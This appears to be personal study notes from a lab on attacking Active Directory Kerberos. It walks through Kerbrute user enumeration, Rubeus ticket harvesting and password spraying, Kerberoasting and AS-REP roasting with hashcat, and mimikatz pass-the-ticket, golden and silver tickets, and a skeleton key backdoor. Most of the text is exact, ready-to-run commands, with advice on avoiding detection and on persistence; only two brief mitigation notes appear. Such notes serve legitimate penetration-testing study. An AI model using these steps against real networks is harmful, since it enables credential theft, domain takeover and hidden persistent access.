--------------------------------------------------------------------------------------------------------------------------------------------------------------
Kerberos  &  Kerbrute Enumeration  &  Pass the Ticket  &  Kerberoasting  &  AS-REP Roasting  &  Golden Ticket  &  Silver Ticket  &  Skeleton Key
--------------------------------------------------------------------------------------------------------------------------------------------------------------
Main ticket we see is a TGT, these can come in various forms such as a [.kirbi for Rubeus] [.ccache for Impacket] A ticket is typically base64 encoded and can be used 
for various attacks. The TGT is only used with the KDC in order to get service tickets. Once you give the TGT the server then gets the User details, session key, and then 
encrypts the ticket with the service account NTLM hash. Your TGT then gives the encrypted timestamp, session key, and the encrypted TGT. The KDC will then authenticate the
TGT and give back a service ticket for the requested service. A normal TGT will only work with that given service account that is connected to it however a KRBTGT allows you
to get "any service ticket" that you want allowing you to access anything on the domain that you want.

      Attack Privilege Requirements -
                                      Kerbrute Enumeration - No domain access required 
                                      Pass the Ticket - Access as a user to the domain required
                                      Kerberoasting - Access as any user required
                                      AS-REP Roasting - Access as any user required
                                      Golden Ticket - Full domain compromise (domain admin) required 
                                      Silver Ticket - Service hash required 
                                      Skeleton Key - Full domain compromise (domain admin) required
---------------------------------------------------------------------------------------------------------------------------------------------------------------
Enumeration w/ Kerbrute               TOOL:   Kerbrute                               <-- SEE "ATTACKS / AD enum exploit"
----------------------------------------------------------------------------------------------------------------------------------------------------------------
NOTE: You need to add 'DNS domain name' along w/ the 'machine IP' to '/etc/hosts' insideyour attacker machine or these attacks will not work for you 
       MACHINE_IP  CONTROLLER.local   

Abusing Pre-Authentication Overview -
      Brute-forcing Kerberos pre-authentication, you do not trigger the 'account failed to log on event' which can throw up red flags to blue teams. When
      brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a 
      wordlist.

Kerbrute Installation
                        1.) Download a precompiled binary for your OS - https://github.com/ropnop/kerbrute/releases
                        2.) Rename kerbrute_linux_amd64 to kerbrute
                        3.) chmod +x kerbrute - make kerbrute executable

Enumerating Users w/ Kerbrute -
                              P.) "nmap -T5 -A [IP]"clear
                              <- will return machinename.Domain Name  i.e.  Comp1.controller.local
                              1.) cd into the directory that you put Kerbrute 
                              Brute force user accounts from a domain controller using wordlist
                              2.) "./kerbrute userenum --dc <DC's_IP> -d controller.local userlist.txt -t 100"           
-----------------------------------------------------------------------------------------------------------------------------------------------------------                  
 Harvesting Tickets                 COMLETED WHEN ON Domain CONTROLLER            TOOLS:  Rubeus    https://github.com/GhostPack/Rubeus                           
----------------------------------------------------------------------------------------------------------------------------------------------------------
TOOLS:  Rubeus    https://github.com/GhostPack/Rubeus 
Rubeus is a powerful tool for attacking Kerberos. Rubeus has a wide variety of attacks and features that allow it to be a very versatile tool for attacking Kerberos.
        tools and attacks include:
                                  overpass the hash
                                  ticket requests and renewals
                                  ticket management
                                  ticket extraction
                                  harvesting
                                  pass the ticket
                                  AS-REP Roasting
                                  Kerberoasting 
Harvesting gathers tickets that are being transferred to the KDC and saves them for use in other attacks.      
      1.) cd Navigate to Rubeus
      2.) Rubeus.exe harvest /interval:30                                     <- This command tells Rubeus to harvest for TGTs every 30 seconds
----------------------------------------------------------------------------------------------------------------------------------------------------------
Brute-Forcing / Password-Spraying w/ Rubeus                            
----------------------------------------------------------------------------------------------------------------------------------------------------------
Rubeus can both brute force passwords as well as password spray user accounts. 
          1.) brute-forcing passwords uses a single user account and a wordlist of passwords to see which password works for that given user account 
          2.) In password spraying, you give a single password and "spray" against all found USER accounts in the domain to find which one may have that password.

This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket. This ticket is a TGT that can be used in order to get
service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.

Before password spraying with Rubeus, you need to add the "domain controller domain name" to the windows "host file" You can add the IP and domain name to the hosts file from
a Windows machine by using the echo command:            

echo [DC-IP] [DC_domain_name] >> C:\Windows\System32\drivers\etc\hosts                       e.x "echo 10.10.221.229 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts"

1.) cdNavigate Rubeus
2.) Rubeus.exe brute /password:Password1 /noticket           <- This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user
----------------------------------------------------------------------------------------------------------------------------------------------------------
Kerberoasting w/ Rubeus & Impacket                                      COMLETED WHEN ON Domain CONTROLLER && Crack on Attacker machine
----------------------------------------------------------------------------------------------------------------------------------------------------------
Most popular Kerberos attack Kerberoasting. 
    Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. 
    If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as 
    well as the privileges of the cracked service account. 

To enumerate Kerberoastable accounts I would suggest BloodHound to find all Kerberoastable accounts 
    Bloodhound allow you to see what kind of accounts you can kerberoast, if they are domain admins, and what kind of connections they have to the rest of the domain. 
    
To perform attack: Use Rubeus, Impacket so you understand the various tools out there for Kerberoasting. 
    There are other tools out there such as "kekeo" and "Invoke-Kerberoast" 

            1.) Navigate to Rubeus  Dir
            2.) Rubeus.exe kerberoast                                                <- This will dump the Kerberos hash of any kerberoastable users
            3.) copy the hash onto your attacker machine and put it into a .txt file so we can crack it with hashcat
            4.) hashcat -m 13100 -a 0 hash.txt Pass.txt                              <- now crack that hash

What Can a Service Account do?
After cracking the service account password there are various ways of exfiltrating data or collecting loot depending on whether the service account is a domain admin or not. 
If the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the "NTDS.dit"[Ntds. dit file is 
a database that stores Active Directory data, including information about user objects, groups, and group membership. Includes the password hashes for all users in the 
domain] If the service account is not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against 
other service and domain admin accounts; many companies may reuse the same or similar passwords for their service or domain admin users. 

----------------------------------------------------------------------------------------------------------------------------------------------------------
AS-REP Roasting w/ Rubeus          " pre-authentication for user account needs to be disabled "  COMLETED WHEN ON Domain CONTROLLER  Crack on Attacker machine
----------------------------------------------------------------------------------------------------------------------------------------------------------
Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled.
            - Other tools out as well for AS-REP Roasting: kekeo, Impacket's GetNPUsers.py.
            - Rubeus is easier to use because it automatically finds AS-REP Roastable users whereas GetNPUsers you have to enumerate the users beforehand and know which 
              users may be AS-REP Roastable.
AS-REP Roasting Overview: 
[During pre-authentication] the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being
used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. 
If pre-authentication is [disabled] you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the 
KDC skips the step of validating that the user is really who they say that they are.

Dumping KRBASREP5 Hashes w/ Rubeus
            1.) cd navigate Dir Rubeus is in
            2.) Rubeus.exe asreproast               <- Runs the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.
            
Crack those Hashes w/ hashcat - 
            1.) Transfer the hash from the target machine over to your attacker machine and put the hash into a txt file
            2.) Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....
            3.) hashcat -m 18200 hash.txt Pass.txt                                                    <- Rubeus AS-REP Roasting uses hashcat mode 18200 
            4.) hashcat -m 18200 --show hash.txt Pass.txt                                             <- Reveals Password in TERMINAL

AS-REP Roasting Mitigations:
Strong password the hashes will take longer to crack making this attack less effective
Don't turn off Kerberos Pre-Authentication unless it's necessary there's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.
----------------------------------------------------------------------------------------------------------------------------------------------------------
Pass the Ticket w/ MIMIKATZ                                                                  COMLETED WHEN ON Domain CONTROLLER
----------------------------------------------------------------------------------------------------------------------------------------------------------
Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however well be using
mimikatz in order to dump a TGT from LSASS memory

Pass the Ticket Overview - 
Pass the ticket works by dumping the TGT from the LSASS memory. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an 
active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can 
dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a [.kirbi] ticket which can be used
to gain domain admin if a domain admin ticket is in the LSASS memory. This attack is great for privilege escalation and lateral movement if there are unsecured domain 
service account tickets laying around. The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using mimikatz
[PTT attack] allowing you to act as that domain admin. You can think of a pass the ticket attack like reusing an existing ticket were not creating or
destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.
---------------------------
Prepare Mimikatz & Dump Tickets - 
---------------------------
You will need to run the command prompt as an administrator:If you don't have an elevated command prompt mimikatz will not work properly !!
            
            1.) cd navigate to the directory mimikatz is in
            2.) mimikatz.exe                                            <- run mimikatz
            3.) privilege::debug                                        <- Ensure output is [output '20' OK] if it doesn't, you do not have the administrator privileges to 
                                                                           properly run mimikatz
            4.) sekurlsa::tickets /export                               <- this will export all of the .kirbi tickets into the directory that you are currently in

At this step you can also use the base 64 encoded tickets from Rubeus that we harvested earlier
When looking for which ticket to impersonate I would recommend looking for an administrator ticket from the krbtgt. '...Administrator@krbtgt-CONTROLLER.LOCAL.kirbi...'
---------------------------
Pass the Ticket w/ Mimikatz
---------------------------
Now that we have our ticket ready we can now perform a pass the ticket attack to gain domain admin privileges.

            1.) kerberos::ptt <ticket>                                   <- Instructs mimikatz to inject the forged ticket to memory to make it usable immediately
                                                     e.x.  kerberos::ptt [0;1695f6]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi 
            2.) exit mimikatz and eneter CMD prompt         
            3.) C:> klist                                                <- Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.

We will not be using mimikatz for the rest of the attack.
            You now have impersonated the ticket giving you the same rights as the TGT you're impersonating. To verify this we can look at the admin share.
            4.) C:> \\[IP-ADDR-OF-COMP]\admin$                           <- See if you can view admin drive on other computers


Note that this is only a POC to understand how to pass the ticket and gain domain admin the way that you approach passing the ticket may be different based on what kind
of engagement you're in so do not take this as a definitive guide of how to run this attack.

Pass the Ticket Mitigation -

Let's talk blue team and how to mitigate these types of attacks. 

Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers
leaving tickets around that we can use to attack and move laterally with.
----------------------------------------------------------------------------------------------------------------------------------------------------------
Golden/Silver Ticket Attacks w/ mimikatz                                                          COMLETED WHEN ON Domain CONTROLLER
----------------------------------------------------------------------------------------------------------------------------------------------------------
A silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet. If stealth and staying undetected matter 
then a silver ticket is probably a better option than a golden ticket however the approach to creating one is the [exact same]. The key difference between the two tickets 
is that a silver ticket is limited to the [SERVICE] that is targeted whereas a golden ticket has access to [ANY KERBEROS SERVICE]

A specific use scenario for a silver ticket would be that you want to access the domain's SQL server however your current compromised user does not have access to that 
server. You can find an accessible service account to get a foothold with by kerberoasting that service, you can then dump the service hash and then impersonate their 
TGT in order to request a service ticket for the SQL service from the KDC allowing you access to the domain's SQL server.

Golden/Silver Ticket Attack Overview - 

A golden ticket attack works by dumping the TGT of ANY user on the domain (preferably Domain Admin) however for a golden ticket you would dump the KRBTGT ticket and for 
a silver ticket you would dump ANY SERVICE or Domain Admin Ticket. This will provide you with the service/domain admin account's SID (security identifieris an unique 
identifier for each user account) as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates 
the given service account information.
------------------------------
Dump the krbtgt hash -
------------------------------
            1.) cd downloads && mimikatz.exe                                                          <- navigate to the directory mimikatz is in and run mimikatz
            2.) privilege::debug                                                                      <- ensure this outputs [privilege '20' ok]
            3.) lsadump::lsa /inject /name:krbtgt                         <- This will dump the hash as well as the security identifier needed to create a Golden Ticket.
                                                                             To create a silver ticket you need to change the /name: to dump the hash of either a domain 
------------------------------                                               admin account or a service account such as the SQLService account.
Create a Golden/Silver Ticket - 
------------------------------
      1.) Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:        <- This is the same cmmd for creating a golden ticket & a silver ticket
                                                                                                      simply put a service NTLM hash into the krbtgt slot, the sid of the 
                                                                                                      service account into sid, and change the id to 1103.
  e.x. GOLDEN TICKET
       kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-S-21-46464.....464 /krbtgt:543....5353 /id:500
  e.x. SILVER TICKET
       kerberos::golden /user:Administrator /domain:controller.local /sid:[ENTER-Service-Account-SID] /krbtgt:[NTLM-hash-here] /id:1103
       
To FIND NTLM hash of specific user "lsadump::lsa /inject /name:krbtgt"      <- Change krbtgt -. admin -> SQLService -> etc... 
       
------------------------------
Use the Golden/Silver Ticket to access other machines -
------------------------------
1.) misc::cmd                                               <- this will open a new elevated command prompt with the given ticket in mimikatz.

2.) \\[IP-Hostname-of-Comp]\c$                              <- see if you can get on a computer

NOTE: Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket 
from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a
domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.
----------------------------------------------------------------------------------------------------------------------------------------------------------
Kerberos Backdoors w/ Mimikatz
----------------------------------------------------------------------------------------------------------------------------------------------------------
Along with maintaining access using golden and silver tickets mimikatz has another tactic when attacking Kerberos. Unlike the golden and silver ticket attacks a Kerberos 
backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines
with a [MASTER PASSWORD] 

The Kerberos backdoor works by implanting a [SKELETON KEY] that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using [Kerberos 
RC4 encryption] 

The default hash for a mimikatz skeleton key is 60BA4FCADC466C7A033C178194C03DF6 which makes the password -"mimikatz"

Skeleton Key Overview -

The skeleton key works by abusing the AS-REQ encrypted timestamps, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this 
timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the 
skeleton key NT hash allowing you access to the domain forest.
------------------------------
Preparing Mimikatz - 
------------------------------
      1.) cd Downloads && mimikatz.exe                      <- Navigate to the directory mimikatz is in and run mimikatz
      2.) privilege::debug                                  

Installing the Skeleton Key w/ mimikatz -

      1.) misc::skeleton                                    

Accessing the forest - 

The default credentials will be: "mimikatz"

example: net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz        <- The share will now be accessible without the need for the Administrators password

example: dir \\Desktop-1\c$ /user:Machine1 mimikatz                           <- access the directory of Desktop-1 without ever knowing what users have access to Desktop-1

The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques!


